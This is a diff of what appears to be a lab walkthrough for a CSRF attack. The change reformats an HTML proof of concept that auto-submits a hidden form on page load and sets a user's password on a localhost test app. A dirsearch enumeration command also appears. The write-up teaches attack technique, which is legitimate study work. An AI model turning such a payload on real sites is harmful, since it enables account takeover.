@@ -81,21 +81,13 @@ python3 dirsearch.py -u http://localhost:3000 -e html,php
 
 8. So the html document for changing the password should contain fields like:
 
-```
-<html>
-
+```<html>
 <body onload='document.csrf.submit()'>
-
 <form action='http://localhost:3000/users/profile/6019076df85a8b0ba08ef990' name='csrf' method='POST'>
-
 <input type='hidden' name='password' value='1'>
-
 <input type='hidden' name='confirm_password' value='1'>
-
 </form>
-
 </body>
-
 </html>
 ```
 9.  Here in this html document the body tag will load and submit this document, the form tag is performing the action on the profile of the user whose UID is mentioned and the action which which is to be performed is of changing the password value mentioned in the hidden parameters(password,confirm_password).
